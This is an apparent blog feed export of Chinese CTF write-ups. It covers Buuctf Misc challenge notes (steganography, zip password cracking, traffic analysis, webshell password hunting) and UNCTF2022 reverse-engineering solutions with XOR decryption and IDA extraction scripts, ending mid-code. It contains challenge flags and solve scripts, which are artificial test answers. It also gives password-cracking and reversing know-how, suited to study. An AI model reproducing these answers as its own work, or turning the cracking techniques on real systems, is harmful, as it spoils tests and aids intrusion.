class="string">&#x27;plain: 1 2&#x27;</span>)</span><br><span class="line">    encrypt(v, <span class="built_in">len</span>(v), k)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;encrypted: %X %X&#x27;</span> % (v[<span class="number">0</span>].value, v[<span class="number">1</span>].value))</span><br><span class="line">    decrypt(v, <span class="built_in">len</span>(v), k)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;decrypted: %X %X&#x27;</span> % (v[<span class="number">0</span>].value, v[<span class="number">1</span>].value))</span><br><span class="line"></span><br><span class="line">————————————————</span><br><span class="line">此段代码为转载，原文链接：https://blog.csdn.net/koxb/article/details/<span class="number">120088234</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf-Misc</title>
      <link href="/2023/03/31/BuuCTF-Misc/"/>
      <url>/2023/03/31/BuuCTF-Misc/</url>
      
        <content type="html"><![CDATA[<ul><li>Buuctf-Misc<span id="more"></span></li></ul><HR color="red"></HR><h2 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h2><ul><li>gifframe捕捉帧</li></ul><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><ul><li>binwalk检测出隐藏zip</li><li>foremost分离zip</li><li>azpr破解zip密码得到flag</li></ul><h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><ul><li>winhex查看，末尾存flag</li></ul><h2 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h2><ul><li>同上</li></ul><h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><ul><li>图片高度隐藏，winhex修改图片高度即可</li></ul><h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><ul><li><p>假的exe文件，010打开发现是个base64，网站在线解码输出为png，是个二维码，扫码得flag</p></li><li><p>直接将原字符作为url获得二维码</p></li><li><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;    &lt;title&gt;png&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;img src=&quot;data:image/jpg;base64,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&quot;&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></li></ul><h2 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h2><ul><li>azpr破解zip密码</li></ul><h2 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h2><ul><li><p>wireshark捕获post请求即可</p><blockquote><p>http.request.method&#x3D;&#x3D;POST</p></blockquote></li></ul><h2 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h2><ul><li>右键属性即可</li></ul><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><ul><li>Stegsolve发现最上方隐写</li><li>输出为png二维码</li></ul><h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><ul><li>修改deflags为0即可</li></ul><h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><ul><li>直接爆破四位数字</li></ul><h2 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h2><ul><li>wireshark打开搜索flag</li></ul><h2 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h2><ul><li>qr直接识别</li></ul><h2 id="镜子中的世界"><a href="#镜子中的世界" class="headerlink" title="镜子中的世界"></a>镜子中的世界</h2><ul><li>LSB，RGB三个0</li></ul><h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><ul><li>提示加密，是个图片</li><li>binwalk分离zip，然后爆破zip密码</li></ul><h2 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h2><ul><li>同上</li></ul><h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><ul><li>同上，但是密码放在了图片属性里</li></ul><h2 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h2><ul><li>wireshark搜索追踪</li></ul><h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><ul><li>010搜索flag</li><li>base64</li><li>翻找没有意义，永远相信ctrlf</li></ul><h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><ul><li>010打开发现01串，转为acsii</li></ul><h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><ul><li>LSB rgb勾选保存为zip</li><li>linux运行elf文件</li></ul><h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><ul><li>爆破，brainfuck</li></ul><h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><ul><li>盲文解密压缩包，摩斯密码音频</li></ul><h2 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h2><ul><li>D盾到后门文件找pass即可</li></ul><h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><ul><li>同上</li></ul><h2 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h2><ul><li>摩斯音频</li></ul><h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><ul><li>路由器备份文件</li><li>RouterPassView查找username</li></ul><h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><ul><li>binwalk -e 分离出flag.vmdk</li><li>7z x flag.vmdk -o.&#x2F;解压文件</li><li>brainfuck &amp; Ook!</li></ul><h2 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h2><ul><li>binwalk -e分离zip</li><li>good图片未加密，修改标志位</li><li>steghide extract -sf pic得到flag.txt解压密码</li></ul><h2 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h2><ul><li>wireshark搜索login即可</li></ul><h2 id="BJDCTF2020-认真你就输了"><a href="#BJDCTF2020-认真你就输了" class="headerlink" title="[BJDCTF2020]认真你就输了"></a>[BJDCTF2020]认真你就输了</h2><ul><li>zip打开找就行了</li></ul>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNCTF2022-WP</title>
      <link href="/2023/03/31/UNCTF2022/"/>
      <url>/2023/03/31/UNCTF2022/</url>
      
        <content type="html"><![CDATA[<ul><li>UNCTF2022-WP<span id="more"></span></li></ul><HR color="red"></HR><h1 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h1><ul><li>这场比赛算是我第一场长时间全程投入的比赛，每天从早上打到晚上12点，不得不说，还挺享受整个过程。全程rank最好的时候是第3，前期分数拉满，中期乏力，最后两天直接冥想坐牢，比赛结束前半小时才A掉培根密码题，守住了rank19。后10名的分差是真的小，再加上最后垂直上分的佬，节目效果拉满，刺激。</li><li>赛题方面，从我的角度看的话：<ul><li>reverse方面的题可能不是很友好，重复+部分偏门。2个upx壳、1个手动壳，2个rust逆向，以及ast普及和小改xxtea。</li><li>crypto和misc方向的题目基本知识点覆盖还是比较全面的。很多东西之前都没有见过，纯google现场学习。尤其是隐写文章看了一大堆，虽然misc没写出几道…….太菜了</li></ul></li><li>整个比赛打下来确实学到不少东西，挺好</li></ul><h1 id="WP"><a href="#WP" class="headerlink" title="WP"></a>WP</h1><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a><code>Reverse</code></h2><h3 id="whereisyourkey-广东海洋大学"><a href="#whereisyourkey-广东海洋大学" class="headerlink" title="whereisyourkey-广东海洋大学"></a>whereisyourkey-广东海洋大学</h3><ul><li>直接模拟加密过程就行了，不多说</li><li>远程linux调试elf执行到加密结束提取数据也行</li></ul><h3 id="halo-绍兴元培"><a href="#halo-绍兴元培" class="headerlink" title="halo-绍兴元培"></a>halo-绍兴元培</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点`：`upx脱壳`，`逻辑运算`，`异或解密</span><br></pre></td></tr></table></figure><ul><li><p>这个题多少有点绕</p></li><li><p>最后用来校对的那一堆异或和或，只有每个异或结果为0条件才为真，也就是说单个异或的结果都是相等的，通过这里就可以得到操作过后的flag</p></li><li><p>中间的加密，通过分析代码可以发现规律</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f0 = f0^0  </span><br><span class="line">ff1 = f0^0^f1^1</span><br><span class="line">f2 = f2^2^f0^0^f1^1</span><br><span class="line"></span><br><span class="line">相当于，顺序加密：fn = fn-1 ^ n</span><br><span class="line"></span><br><span class="line">所以反过来异或回去就完了</span><br></pre></td></tr></table></figure></li><li><p>最上面还有个array^0x33，就是array数组第一位异或，弄一下就行</p></li><li><p>解密脚本</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">list = [<span class="number">102</span>, <span class="number">0xb</span>,<span class="number">0x68</span>,<span class="number">0xc</span>,<span class="number">0x73</span>,<span class="number">0x3e</span>,<span class="number">0xc</span>,<span class="number">0x3a</span>,<span class="number">0x5d</span>,<span class="number">0x1b</span>,<span class="number">0x21</span>,<span class="number">0x75</span>,<span class="number">0x4f</span>,<span class="number">0x20</span>,<span class="number">0x4c</span>,<span class="number">0x71</span>,<span class="number">0x58</span>,<span class="number">0x7b</span>,<span class="number">0x59</span>,<span class="number">0x2c</span>,<span class="number">0x0</span>,<span class="number">0x77</span>,<span class="number">0x58</span>,<span class="number">0x77</span>,<span class="number">0xe</span>,<span class="number">0x72</span>,<span class="number">0x5b</span>,<span class="number">0x26</span>,<span class="number">0xb</span>,<span class="number">0x70</span>,<span class="number">0xa</span>,<span class="number">0x77</span>,<span class="number">0x66</span>,<span class="number">0x77</span>,<span class="number">0x36</span>,<span class="number">0x76</span>,<span class="number">0x37</span>,<span class="number">0x76</span>,<span class="number">0x62</span>,<span class="number">0x72</span>,<span class="number">0x6d</span>,<span class="number">0x27</span>,<span class="number">0x3f</span>,<span class="number">0x77</span>,<span class="number">0x26</span>]</span><br><span class="line">x = <span class="number">44</span></span><br><span class="line"><span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">    list[x] = list[x]^list[x<span class="number">-1</span>]^x</span><br><span class="line">    x -= <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i in list:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i),end=<span class="string">&#x27;&#x27;)</span></span><br><span class="line"><span class="string"># flag&#123;H41oO0_6bb2920f8b98ae3f1fdb10cced277c2c&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>对了，还有个upx脱壳，直接工具搞一下</p></li></ul><h3 id="ezzzzre-广东海洋大学"><a href="#ezzzzre-广东海洋大学" class="headerlink" title="ezzzzre-广东海洋大学"></a>ezzzzre-广东海洋大学</h3><ul><li><p>有个upx壳，工具脱掉</p></li><li><p>F5主函数</p></li><li><p>核心代码就这一行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ( Str[i] != 2 * aHelloctf[i] - 69 )</span><br></pre></td></tr></table></figure></li><li><p>提取Helloctf[i]直接计算即可</p></li></ul><h3 id="Sudoku-陆军工程大学"><a href="#Sudoku-陆军工程大学" class="headerlink" title="Sudoku-陆军工程大学"></a>Sudoku-陆军工程大学</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点`：`动态调试`，`数据提取`，`python</span><br></pre></td></tr></table></figure><ul><li><p>IDA反编F5+cmd运行测试</p></li><li><p>好像是个数独，分析一下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  </span><br><span class="line">  ......  </span><br><span class="line"><span class="comment">//生成检测数独</span></span><br><span class="line">  <span class="keyword">while</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">Prepare</span>((<span class="built_in">int</span> (*)[<span class="number">9</span>])v12) )  </span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">8</span>; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !v12[<span class="number">9</span> * i + j] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">8</span>; ++k )</span><br><span class="line">            v4[k] = <span class="number">0</span>;<span class="comment">//生成函数</span></span><br><span class="line">          <span class="built_in">line</span>((<span class="built_in">int</span> (*)[<span class="number">9</span>])v12, v4, i);</span><br><span class="line">          <span class="built_in">row</span>((<span class="built_in">int</span> (*)[<span class="number">9</span>])v12, v4, j);</span><br><span class="line">          <span class="built_in">SquireNine</span>((<span class="built_in">int</span> (*)[<span class="number">9</span>])v12, v4, i, j);</span><br><span class="line">          <span class="built_in">FillBlank</span>((<span class="built_in">int</span> (*)[<span class="number">9</span>])v12, v4, i, j);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//提示信息输出</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;This is a game called Sudoku,just enjoy it!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Pls input your answer in the following format:&quot;</span>);</span><br><span class="line">  <span class="built_in">qmemcpy</span>(v14, &amp;unk_4051C0, <span class="number">0x144</span>ui64);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">8</span>; ++j )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v14[<span class="number">9</span> * i + j]);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//输入数独</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Then you will get your flag!&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">8</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">8</span>; ++j )</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v11[<span class="number">9</span> * i + j]);              </span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//校验</span></span><br><span class="line">  <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">8</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">8</span>; ++m )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v11[<span class="number">9</span> * k + m] != v12[<span class="number">9</span> * k + m] ) </span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Y0u_Ar3_Wr0ng!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Y0u_Ar3_R1ght!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>第一眼就看到v11和v12比较，所以我们要想办法把v12搞出来，首先跟踪上面的生成函数，很复杂，那就动态调试，让机器生成v12我们去提取数据</p></li><li><p>v12生成函数结束后位置设断点，运行，然后f5反编找到v12对应栈位置，写脚本提取数据</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> addr = <span class="number">0x000000000062FA10</span>;</span><br><span class="line"><span class="keyword">auto</span> i = <span class="number">0</span>,cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i; i &lt; <span class="number">81</span>*<span class="number">4</span>; i = i+<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Message</span>(<span class="string">&quot;%x &quot;</span>,<span class="built_in">Byte</span>(addr+i));</span><br><span class="line">cnt = cnt + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(cnt % <span class="number">9</span> == <span class="number">0</span>)</span><br><span class="line">   <span class="built_in">Message</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//8 5 2 4 9 1 6 7 3 </span></span><br><span class="line"><span class="comment">//1 9 6 7 3 8 2 5 4 </span></span><br><span class="line"><span class="comment">//4 3 7 5 6 2 9 1 8 </span></span><br><span class="line"><span class="comment">//5 2 8 1 4 6 3 9 7 </span></span><br><span class="line"><span class="comment">//3 7 4 9 2 5 8 6 1 </span></span><br><span class="line"><span class="comment">//9 6 1 3 8 7 4 2 5 </span></span><br><span class="line"><span class="comment">//2 1 9 8 5 4 7 3 6 </span></span><br><span class="line"><span class="comment">//7 4 3 6 1 9 5 8 2 </span></span><br><span class="line"><span class="comment">//6 8 5 2 7 3 1 4 9</span></span><br></pre></td></tr></table></figure></li><li><p>继续运行，输入提取的数独</p></li><li><p>运行到显示：</p><blockquote><p>UNCTF{chr(29+vme)chr(15+vme)chr(29+vme)chr(24+vme)chr(39+vme)chr(25+vme)chr(29+vme)chr(20+vme)chr(32+vme)}</p></blockquote></li><li><p>python解一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;UNCTF&#123;&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">29</span>+<span class="number">50</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">15</span>+<span class="number">50</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">29</span>+<span class="number">50</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">24</span>+<span class="number">50</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">39</span>+<span class="number">50</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">25</span>+<span class="number">50</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">29</span>+<span class="number">50</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">20</span>+<span class="number">50</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span 